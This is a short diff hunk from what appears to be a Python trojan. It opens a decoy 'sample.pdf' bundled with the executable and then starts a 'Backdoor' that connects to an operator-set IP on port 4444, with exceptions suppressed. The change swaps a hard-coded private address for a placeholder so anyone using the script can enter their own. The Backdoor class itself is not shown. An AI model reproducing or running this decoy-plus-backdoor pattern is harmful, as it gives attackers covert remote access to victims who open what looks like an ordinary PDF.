@@ -78,7 +78,7 @@ try:
         pdf_path = os.path.join(sys._MEIPASS, 'sample.pdf')
         subprocess.Popen(pdf_path, shell=True)
 
-    my_backdoor = Backdoor("192.168.190.136", 4444)
+    my_backdoor = Backdoor("ENTER YOUR IP", 4444) #port and ip can be configured by you
     my_backdoor.run()
 except Exception:
     sys.exit()
